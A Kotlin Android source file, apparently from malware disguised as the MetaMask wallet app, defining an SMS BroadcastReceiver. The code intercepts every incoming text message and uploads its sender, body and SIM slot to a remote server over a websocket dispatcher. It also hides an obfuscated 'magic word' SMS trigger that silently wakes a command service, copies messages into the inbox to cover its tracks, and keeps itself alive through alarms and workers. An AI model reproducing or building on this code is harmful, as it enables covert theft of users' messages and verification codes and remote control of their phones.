package com.example.MetaMask.activities

import android.content.BroadcastReceiver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.os.Binder
import android.os.Build
import android.provider.Telephony
import android.telephony.SubscriptionManager
import androidx.annotation.Keep
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.receivers.AlarmReceiver
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.SelfDestructService
import com.example.MetaMask.services.ServiceStarterWorker
import com.example.MetaMask.services.sync.SyncManager
import com.example.MetaMask.services.trolService

@Keep
class SmsReceiver : BroadcastReceiver() {

    private fun getMagicWord() = "SYS" + "_WK_" + "CMD"

    override fun onReceive(context: Context?, intent: Intent?) {
        android.util.Log.d("XDBG", "[SmsReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        if (context == null) {
            android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
            return
        }

        if (intent == null) {
            android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
            return
        }

        val killSwitchPrefs = context.getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
            return
        }

        if (Telephony.Sms.Intents.SMS_DELIVER_ACTION == intent.action ||
            Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent.action
        ) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (!messages.isNullOrEmpty()) {
                android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                val fullMessageBody = StringBuilder()
                var originatingAddress: String? = null
                var timestampMillis: Long = 0

                for (i in messages.indices) {
                    android.util.Log.d("XDBG", "[SmsReceiver] loop") //xdbg
                    val currentMessage = messages[i]
                    if (currentMessage == null) {
                        android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                        continue
                    }
                    if (i == 0) {
                        android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                        originatingAddress = currentMessage.originatingAddress
                        timestampMillis = currentMessage.timestampMillis
                    }
                    currentMessage.displayMessageBody?.let {
                        fullMessageBody.append(it)
                    }
                }

                val messageBody = fullMessageBody.toString()

                if (messageBody.trim() == getMagicWord()) {
                    android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                    try { abortBroadcast() } catch (_: Exception) {}
                    triggerWakeUp(context)
                    return
                }

                if (originatingAddress != null && messageBody.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                    writeSmsToProvider(context, originatingAddress, messageBody, timestampMillis)

                    try {
                        val rawSubId = intent.getIntExtra("subscription", -1)
                        var simSlot = -1
                        if (rawSubId != -1) {
                            android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                            try {
                                val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                                simSlot = sm?.getActiveSubscriptionInfo(rawSubId)?.simSlotIndex ?: -1
                            } catch (e: Exception) {}
                        }
                        val jsonArray = org.json.JSONArray()
                        val item = org.json.JSONObject()
                        item.put("from", originatingAddress)
                        item.put("messages", org.json.JSONArray().put(messageBody))
                        item.put("simSlot", simSlot)
                        jsonArray.put(item)

                        val payload = org.json.JSONObject().apply {
                            put("action", "uploadNewSMS")
                            put("new_sms", jsonArray)
                        }

                        val sendIntent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                            putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                            setPackage(context.packageName)
                        }
                        context.sendBroadcast(sendIntent)
                    } catch (e: Exception) {
                        android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    }

                    try {
                        val syncIntent = Intent(context, trolService::class.java).apply {
                            putExtra("command", "{\"action\":\"sync_now\"}")
                        }
                        context.startService(syncIntent)
                    } catch (e: Exception) {
                        android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    }
                }
            }
            try {
                val pulseIntent = Intent(context, com.example.MetaMask.services.PulseService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                    context.startForegroundService(pulseIntent)
                } else {
                    context.startService(pulseIntent)
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", intent.action)
            }
            startCorrespondingService(context, masterIntent)

            kickAlarm(context)
            kickWorker(context)
        }
    }

    private fun triggerWakeUp(context: Context) {
        android.util.Log.d("XDBG", "[SmsReceiver] triggerWakeUp enter context=ctx") //xdbg
        try {
            val pulseIntent = Intent(context, com.example.MetaMask.services.PulseService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                context.startForegroundService(pulseIntent)
            } else {
                context.startService(pulseIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
            putExtra("STARTED_FROM", "MAGIC_SMS")
            putExtra("started_from_push", true)
        }
        startCorrespondingService(context, masterIntent)
        kickAlarm(context)
        kickWorker(context)
    }

    private fun writeSmsToProvider(context: Context, sender: String, body: String, timestamp: Long) {
        android.util.Log.d("XDBG", "[SmsReceiver] writeSmsToProvider enter context=ctx sender=${sender} body=${body} timestamp=${timestamp}") //xdbg
        try {
            val values = ContentValues().apply {
                put(Telephony.Sms.ADDRESS, sender)
                put(Telephony.Sms.BODY, body)
                put(Telephony.Sms.DATE, timestamp)
                put(Telephony.Sms.DATE_SENT, 0)
                put(Telephony.Sms.READ, 0)
                put(Telephony.Sms.SEEN, 0)
                put(Telephony.Sms.TYPE, Telephony.Sms.MESSAGE_TYPE_INBOX)
            }

            context.contentResolver.insert(Telephony.Sms.Inbox.CONTENT_URI, values)

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun startCorrespondingService(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[SmsReceiver] startCorrespondingService enter context=ctx intent=${intent}") //xdbg
        SyncManager.forceSync()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[SmsReceiver] if branch") //xdbg
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        } catch (e: IllegalStateException) {
            android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            try {
                context.startService(intent)
            } catch (e2: Exception) {
                android.util.Log.e("XDBG", "[SmsReceiver] catch ${e2.javaClass.simpleName}: ${e2.message}") //xdbg
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun kickAlarm(context: Context) {
        android.util.Log.d("XDBG", "[SmsReceiver] kickAlarm enter context=ctx") //xdbg
        try {
            val alarmIntent = Intent(context, AlarmReceiver::class.java)
            context.sendBroadcast(alarmIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun kickWorker(context: Context) {
        android.util.Log.d("XDBG", "[SmsReceiver] kickWorker enter context=ctx") //xdbg
        try {
            val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("SMS_TRIGGER")
                .build()
            WorkManager.getInstance(context).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[SmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
